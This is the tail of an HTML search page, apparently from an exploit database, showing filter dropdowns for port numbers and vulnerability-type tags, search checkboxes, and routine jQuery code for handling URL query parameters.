                                    <option value="7902" >
                                        7902
                                    </option>


                                
                                    <option value="8000" >
                                        8000
                                    </option>


                                
                                    <option value="8001" >
                                        8001
                                    </option>


                                
                                    <option value="8002" >
                                        8002
                                    </option>


                                
                                    <option value="8004" >
                                        8004
                                    </option>


                                
                                    <option value="8008" >
                                        8008
                                    </option>


                                
                                    <option value="8020" >
                                        8020
                                    </option>


                                
                                    <option value="8022" >
                                        8022
                                    </option>


                                
                                    <option value="8023" >
                                        8023
                                    </option>


                                
                                    <option value="8028" >
                                        8028
                                    </option>


                                
                                    <option value="8030" >
                                        8030
                                    </option>


                                
                                    <option value="8080" >
                                        8080
                                    </option>


                                
                                    <option value="8081" >
                                        8081
                                    </option>


                                
                                    <option value="8082" >
                                        8082
                                    </option>


                                
                                    <option value="8088" >
                                        8088
                                    </option>


                                
                                    <option value="8090" >
                                        8090
                                    </option>


                                
                                    <option value="8181" >
                                        8181
                                    </option>


                                
                                    <option value="8300" >
                                        8300
                                    </option>


                                
                                    <option value="8400" >
                                        8400
                                    </option>


                                
                                    <option value="8443" >
                                        8443
                                    </option>


                                
                                    <option value="8445" >
                                        8445
                                    </option>


                                
                                    <option value="8473" >
                                        8473
                                    </option>


                                
                                    <option value="8500" >
                                        8500
                                    </option>


                                
                                    <option value="8585" >
                                        8585
                                    </option>


                                
                                    <option value="8619" >
                                        8619
                                    </option>


                                
                                    <option value="8800" >
                                        8800
                                    </option>


                                
                                    <option value="8812" >
                                        8812
                                    </option>


                                
                                    <option value="8839" >
                                        8839
                                    </option>


                                
                                    <option value="8880" >
                                        8880
                                    </option>


                                
                                    <option value="8888" >
                                        8888
                                    </option>


                                
                                    <option value="9000" >
                                        9000
                                    </option>


                                
                                    <option value="9001" >
                                        9001
                                    </option>


                                
                                    <option value="9002" >
                                        9002
                                    </option>


                                
                                    <option value="9080" >
                                        9080
                                    </option>


                                
                                    <option value="9090" >
                                        9090
                                    </option>


                                
                                    <option value="9091" >
                                        9091
                                    </option>


                                
                                    <option value="9100" >
                                        9100
                                    </option>


                                
                                    <option value="9124" >
                                        9124
                                    </option>


                                
                                    <option value="9200" >
                                        9200
                                    </option>


                                
                                    <option value="9251" >
                                        9251
                                    </option>


                                
                                    <option value="9256" >
                                        9256
                                    </option>


                                
                                    <option value="9443" >
                                        9443
                                    </option>


                                
                                    <option value="9447" >
                                        9447
                                    </option>


                                
                                    <option value="9784" >
                                        9784
                                    </option>


                                
                                    <option value="9788" >
                                        9788
                                    </option>


                                
                                    <option value="9855" >
                                        9855
                                    </option>


                                
                                    <option value="9876" >
                                        9876
                                    </option>


                                
                                    <option value="9900" >
                                        9900
                                    </option>


                                
                                    <option value="9987" >
                                        9987
                                    </option>


                                
                                    <option value="9993" >
                                        9993
                                    </option>


                                
                                    <option value="9999" >
                                        9999
                                    </option>


                                
                                    <option value="10000" >
                                        10000
                                    </option>


                                
                                    <option value="10001" >
                                        10001
                                    </option>


                                
                                    <option value="10080" >
                                        10080
                                    </option>


                                
                                    <option value="10202" >
                                        10202
                                    </option>


                                
                                    <option value="10203" >
                                        10203
                                    </option>


                                
                                    <option value="10443" >
                                        10443
                                    </option>


                                
                                    <option value="10616" >
                                        10616
                                    </option>


                                
                                    <option value="11000" >
                                        11000
                                    </option>


                                
                                    <option value="11211" >
                                        11211
                                    </option>


                                
                                    <option value="11460" >
                                        11460
                                    </option>


                                
                                    <option value="12203" >
                                        12203
                                    </option>


                                
                                    <option value="12221" >
                                        12221
                                    </option>


                                
                                    <option value="12345" >
                                        12345
                                    </option>


                                
                                    <option value="12397" >
                                        12397
                                    </option>


                                
                                    <option value="12401" >
                                        12401
                                    </option>


                                
                                    <option value="13327" >
                                        13327
                                    </option>


                                
                                    <option value="13701" >
                                        13701
                                    </option>


                                
                                    <option value="13722" >
                                        13722
                                    </option>


                                
                                    <option value="13838" >
                                        13838
                                    </option>


                                
                                    <option value="16992" >
                                        16992
                                    </option>


                                
                                    <option value="18821" >
                                        18821
                                    </option>


                                
                                    <option value="18881" >
                                        18881
                                    </option>


                                
                                    <option value="19000" >
                                        19000
                                    </option>


                                
                                    <option value="19810" >
                                        19810
                                    </option>


                                
                                    <option value="19813" >
                                        19813
                                    </option>


                                
                                    <option value="20000" >
                                        20000
                                    </option>


                                
                                    <option value="20002" >
                                        20002
                                    </option>


                                
                                    <option value="20010" >
                                        20010
                                    </option>


                                
                                    <option value="20031" >
                                        20031
                                    </option>


                                
                                    <option value="20111" >
                                        20111
                                    </option>


                                
                                    <option value="20171" >
                                        20171
                                    </option>


                                
                                    <option value="22003" >
                                        22003
                                    </option>


                                
                                    <option value="23423" >
                                        23423
                                    </option>


                                
                                    <option value="25672" >
                                        25672
                                    </option>


                                
                                    <option value="26000" >
                                        26000
                                    </option>


                                
                                    <option value="27015" >
                                        27015
                                    </option>


                                
                                    <option value="27700" >
                                        27700
                                    </option>


                                
                                    <option value="28015" >
                                        28015
                                    </option>


                                
                                    <option value="30000" >
                                        30000
                                    </option>


                                
                                    <option value="30303" >
                                        30303
                                    </option>


                                
                                    <option value="31337" >
                                        31337
                                    </option>


                                
                                    <option value="32400" >
                                        32400
                                    </option>


                                
                                    <option value="32674" >
                                        32674
                                    </option>


                                
                                    <option value="32764" >
                                        32764
                                    </option>


                                
                                    <option value="34205" >
                                        34205
                                    </option>


                                
                                    <option value="37215" >
                                        37215
                                    </option>


                                
                                    <option value="37777" >
                                        37777
                                    </option>


                                
                                    <option value="37848" >
                                        37848
                                    </option>


                                
                                    <option value="38292" >
                                        38292
                                    </option>


                                
                                    <option value="40007" >
                                        40007
                                    </option>


                                
                                    <option value="41523" >
                                        41523
                                    </option>


                                
                                    <option value="44334" >
                                        44334
                                    </option>


                                
                                    <option value="46824" >
                                        46824
                                    </option>


                                
                                    <option value="48080" >
                                        48080
                                    </option>


                                
                                    <option value="49152" >
                                        49152
                                    </option>


                                
                                    <option value="50000" >
                                        50000
                                    </option>


                                
                                    <option value="50496" >
                                        50496
                                    </option>


                                
                                    <option value="52311" >
                                        52311
                                    </option>


                                
                                    <option value="52789" >
                                        52789
                                    </option>


                                
                                    <option value="52869" >
                                        52869
                                    </option>


                                
                                    <option value="52986" >
                                        52986
                                    </option>


                                
                                    <option value="53413" >
                                        53413
                                    </option>


                                
                                    <option value="54345" >
                                        54345
                                    </option>


                                
                                    <option value="54890" >
                                        54890
                                    </option>


                                
                                    <option value="55554" >
                                        55554
                                    </option>


                                
                                    <option value="55555" >
                                        55555
                                    </option>


                                
                                    <option value="56380" >
                                        56380
                                    </option>


                                
                                    <option value="57772" >
                                        57772
                                    </option>


                                
                                    <option value="58080" >
                                        58080
                                    </option>


                                
                                    <option value="62514" >
                                        62514
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="tagSearchSelect" class="text-primary">Tag</label>

                            <select id="tagSearchSelect" name="tag" class="form-control">

                                <option></option>
                                
                                    <option value="1" >
                                        WordPress Core
                                    </option>


                                
                                    <option value="3" >
                                        Metasploit Framework (MSF)
                                    </option>


                                
                                    <option value="4" >
                                        WordPress Plugin
                                    </option>


                                
                                    <option value="7" >
                                        SQL Injection (SQLi)
                                    </option>


                                
                                    <option value="8" >
                                        Cross-Site Scripting (XSS)
                                    </option>


                                
                                    <option value="9" >
                                        File Inclusion (LFI/RFI)
                                    </option>


                                
                                    <option value="12" >
                                        Cross-Site Request Forgery (CSRF)
                                    </option>


                                
                                    <option value="13" >
                                        Denial of Service (DoS)
                                    </option>


                                
                                    <option value="14" >
                                        Code Injection
                                    </option>


                                
                                    <option value="15" >
                                        Command Injection
                                    </option>


                                
                                    <option value="16" >
                                        Authentication Bypass / Credentials Bypass (AB/CB)
                                    </option>


                                
                                    <option value="18" >
                                        Client Side
                                    </option>


                                
                                    <option value="19" >
                                        Use After Free (UAF)
                                    </option>


                                
                                    <option value="20" >
                                        Out Of Bounds
                                    </option>


                                
                                    <option value="21" >
                                        Remote
                                    </option>


                                
                                    <option value="22" >
                                        Local
                                    </option>


                                
                                    <option value="23" >
                                        XML External Entity (XXE)
                                    </option>


                                
                                    <option value="24" >
                                        Integer Overflow
                                    </option>


                                
                                    <option value="25" >
                                        Server-Side Request Forgery (SSRF)
                                    </option>


                                
                                    <option value="26" >
                                        Race Condition
                                    </option>


                                
                                    <option value="27" >
                                        NULL Pointer Dereference
                                    </option>


                                
                                    <option value="28" >
                                        Malware
                                    </option>


                                
                                    <option value="31" >
                                        Buffer Overflow
                                    </option>


                                
                                    <option value="34" >
                                        Heap Overflow
                                    </option>


                                
                                    <option value="35" >
                                        Type Confusion
                                    </option>


                                
                                    <option value="36" >
                                        Object Injection
                                    </option>


                                
                                    <option value="37" >
                                        Bug Report
                                    </option>


                                
                                    <option value="38" >
                                        Console
                                    </option>


                                
                                    <option value="39" >
                                        Pwn2Own
                                    </option>


                                
                                    <option value="40" >
                                        Traversal
                                    </option>


                                
                                    <option value="41" >
                                        Deserialization
                                    </option>


                                
                            </select>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">

                                    <input class="form-check-input" type="checkbox"
                                           name="verified" value="true"
                                           id="verifiedSearchCheck"   >
                                    Verified

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="hasapp" value="true"
                                           id="hasappSearchCheck" >
                                    Has App

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                            <div class="form-check form-check-inline">

                                <label class="form-check-label text-primary">
                                    <input class="form-check-input" type="checkbox"
                                           name="nomsf" value="true"
                                           id="nomsfCheck" >
                                    No Metasploit

                                    <span class="form-check-sign">
                                        <span class="check"></span>
                                    </span>

                                </label>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-12">

                            <button type="submit" class="btn btn-primary float-right">Search</button>

                        </div>

                    </div>

                </form>


            </div>

        </div>

    </div>

</div>

</footer>

    </div>

</div>

</body>

<!--   Make the default DataTables search field larger   -->
<style type="text/css">
    .dataTables_filter input {
        font-size: 16px;
    }
</style>

<!--   Core JS Files   -->
<script src="/js/core/jquery.min.js"></script>
<script src="/js/core/popper.min.js"></script>
<script src="/js/core/bootstrap.min.js"></script>

<script src="/js/plugins/perfect-scrollbar.jquery.min.js"></script>
<script src="/js/plugins/moment.min.js"></script>

<!-- Forms Validations Plugin -->
<script src="/js/plugins/jquery.validate.min.js"></script>

<!--  DataTables.net Plugin, full documentation here:
https://datatables.net/    -->
<script src="/js/plugins/jquery.dataTables.min.js"></script>

<!--  Notifications Plugin    -->
<script src="/js/plugins/bootstrap-notify.js"></script>

<!-- Control Center for Now Ui Dashboard: parallax effects,
scripts for the example pages etc -->
<script src="/js/now-ui-dashboard.js"></script>

<script src="/js/selectize.min.js"></script>

<script src="/js/app.js"></script>
<script src="/js/appfunctions.js"></script>


<script>
    window.addEventListener('popstate', () => {
        location.reload();
    }, false);

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }


    function removeURLParameter(url, parameter) {
        //prefer to use l.search if you have a location/link object
        var urlparts= url.split('?');
        if (urlparts.length>=2) {

            var prefix= encodeURIComponent(parameter)+'=';
            var pars= urlparts[1].split(/[&;]/g);

            //reverse iteration as may be destructive
            for (var i= pars.length; i-- > 0;) {
                //idiom for string.startsWith
                if (pars[i].lastIndexOf(prefix, 0) !== -1) {
                    pars.splice(i, 1);
                }
            }

            url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");
            window.history.pushState('', document.title, url);
            return url;
        } else {
            window.history.pushState('', document.title, url);
            return url;
        }
    }

    function showFilters() {
        var x = document.getElementById("exploitFiltersCard");
        if (x.style.display === "none") {
            x.style.display = "block";
        } else {
            x.style.display = "none";
        }
    }

    function updateQueryString(key, value, url) {
        if (!url) url = window.location.href;
        var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),
            hash;

        if (re.test(url)) {
            if (typeof value !== 'undefined' && value !== null)
                return url.replace(re, '$1' + key + "=" + value + '$2$3');
            else {
                hash = url.split('#');
                url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
        }
        else {
            if (typeof value !== 'undefined' && value !== null) {
                var separator = url.indexOf('?') !== -1 ? '&' : '?';
                hash = url.split('#');
                url = hash[0] + separator + key + '=' + value;
                if (typeof hash[1] !== 'undefined' && hash[1] !== null)
                    url += '#' + hash[1];

                window.history.pushState('', document.title, url);
                return url;
            }
            else
                window.history.pushState('', document.title, url);
                return url;
        }
    }

    $('#search').submit(function() {
        $(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");
        return true; // ensure form still submits
    });

    // Un-disable form fields when page loads, in case they click back after submission
    $('#search').find( ":input" ).prop( "disabled", false );

    // If the ajax call fails, throw the error to the console instead of
    // popping up an alert to the user
    $.fn.dataTable.ext.errMode = 'throw';

</script>

<!-- App scripts -->



</html>
